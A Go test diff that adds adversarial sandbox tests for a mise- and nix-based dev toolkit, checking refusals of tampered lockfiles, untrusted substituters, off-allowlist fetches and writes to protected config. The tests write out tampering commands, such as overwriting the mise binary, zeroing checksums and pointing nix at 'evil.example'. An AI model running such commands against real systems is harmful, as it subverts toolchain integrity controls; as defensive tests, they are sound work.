@@ -10,6 +10,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"runtime"
 	"strings"
 	"testing"
@@ -114,6 +115,57 @@ func TestSandboxGuarantees(t *testing.T) {
 		out, _ = s.shell("mise settings get disable_backends; mise settings get paranoid; ls -l /etc/mise/config.toml")
 		if !strings.Contains(out, "asdf") || !strings.Contains(out, "true") || !strings.Contains(out, "root root") {
 			t.Fatalf("mise settings should be pinned by root: %s", out)
+		}
+	})
+
+	// Adversarial: code in the sandbox, or a hostile repo, tries to get a
+	// toolchain in that was not pinned, verified or allowed.
+	t.Run("tampered lockfile is refused", func(t *testing.T) {
+		lockPath := filepath.Join(dir, ".devkit", "mise.lock")
+		orig, err := os.ReadFile(lockPath)
+		if err != nil {
+			t.Fatal(err)
+		}
+		zero := regexp.MustCompile(`checksum = "sha256:[0-9a-f]{64}"`)
+		writeFile(t, lockPath, zero.ReplaceAllString(string(orig), `checksum = "sha256:`+strings.Repeat("0", 64)+`"`))
+		t.Cleanup(func() { writeFile(t, lockPath, string(orig)) })
+		// The lock verifies downloads, so make node a download again.
+		s.mustRun("shell", "mise", "uninstall", "--all", "node")
+		out, err := s.run("up", "--no-sync", "--no-install")
+		if err == nil {
+			t.Fatalf("up should fail with a tampered lockfile:\n%s", out)
+		}
+		if o, _ := s.shell("command -v node || echo no-node"); !strings.Contains(o, "no-node") {
+			t.Fatalf("node must not be installed from a mismatching checksum: %s", o)
+		}
+		writeFile(t, lockPath, string(orig))
+		s.mustRun("up", "--no-sync", "--no-install")
+		if o, _ := s.shell("node --version"); !strings.Contains(o, "v22.") {
+			t.Fatalf("node should come back with the genuine lockfile: %s", o)
+		}
+	})
+
+	t.Run("sandbox cannot change the manager or its policy", func(t *testing.T) {
+		out, _ := s.shell("touch /etc/mise/config.toml 2>&1; cp /bin/true /usr/local/bin/mise 2>&1; echo exit=$?")
+		if strings.Count(out, "Permission denied") != 2 || !strings.Contains(out, "exit=1") {
+			t.Fatalf("manager binary and settings should be root-only: %s", out)
+		}
+	})
+
+	t.Run("plugin backends in a repo config are refused", func(t *testing.T) {
+		out, _ := s.shell(`printf '[tools]\n"asdf:mise-plugins/mise-jq" = "latest"\n' > mise.toml; mise install 2>&1; echo exit=$?; rm -f mise.toml; ls "$HOME/.local/share/mise/plugins" 2>/dev/null | wc -l`)
+		if strings.Contains(out, "exit=0") || !strings.HasSuffix(strings.TrimSpace(out), "0") {
+			t.Fatalf("asdf plugin should be refused and nothing cloned: %s", out)
+		}
+	})
+
+	t.Run("toolchain from a host outside the allowlist is blocked", func(t *testing.T) {
+		out, _ := s.shell("mise install zig@0.14.0 2>&1 | tail -n 5; echo exit=${PIPESTATUS[0]}")
+		if strings.Contains(out, "exit=0") {
+			t.Fatalf("zig should not install: ziglang.org is not allowed: %s", out)
+		}
+		if logs := s.mustRun("logs"); !strings.Contains(logs, "BLOCKED") || !strings.Contains(logs, "ziglang.org") {
+			t.Fatalf("the blocked download should be in the audit log:\n%s", logs)
 		}
 	})
 
@@ -251,6 +303,39 @@ func TestNixToolchain(t *testing.T) {
 	if !strings.Contains(out, "exit=1") {
 		t.Fatalf("sudo should be unavailable: %s", out)
 	}
+
+	// Adversarial: the sandbox tries to get around the store, the daemon's
+	// policy and the allowlist.
+	t.Run("store and daemon config are read-only", func(t *testing.T) {
+		out, _ := s.shell("touch /nix/store/pwn 2>&1; touch /etc/nix/nix.conf 2>&1; echo exit=$?")
+		if strings.Count(out, "Permission denied") != 2 {
+			t.Fatalf("the store and nix.conf should be root-only: %s", out)
+		}
+	})
+
+	t.Run("untrusted substituter is ignored", func(t *testing.T) {
+		out, _ := s.shell(`nix build --no-link --substituters https://evil.example --expr 'derivation { name = "x"; system = builtins.currentSystem; builder = "/bin/sh"; args = ["-c" "echo > $out"]; }' 2>&1; echo exit=$?`)
+		if !strings.Contains(out, "untrusted substituter") {
+			t.Fatalf("the daemon should refuse a substituter from a non-trusted user: %s", out)
+		}
+	})
+
+	t.Run("fetch outside the allowlist is blocked", func(t *testing.T) {
+		out, _ := s.shell(`nix eval --impure --expr 'builtins.fetchurl "https://example.com/"' 2>&1 | tail -n 3; echo exit=${PIPESTATUS[0]}`)
+		if strings.Contains(out, "exit=0") {
+			t.Fatalf("example.com is not allowed: %s", out)
+		}
+		if logs := s.mustRun("logs"); !strings.Contains(logs, "BLOCKED") || !strings.Contains(logs, "example.com") {
+			t.Fatalf("the blocked fetch should be in the audit log:\n%s", logs)
+		}
+	})
+
+	t.Run("wrong hash is refused", func(t *testing.T) {
+		out, _ := s.shell(`nix eval --expr 'builtins.fetchurl { url = "https://nodejs.org/dist/index.json"; sha256 = "0000000000000000000000000000000000000000000000000000"; }' 2>&1 | tail -n 3; echo exit=${PIPESTATUS[0]}`)
+		if strings.Contains(out, "exit=0") || !strings.Contains(out, "hash mismatch") {
+			t.Fatalf("a fixed-output fetch with the wrong hash must fail: %s", out)
+		}
+	})
 }
 
 // setYAML replaces one line fragment in devkit.yaml in place.
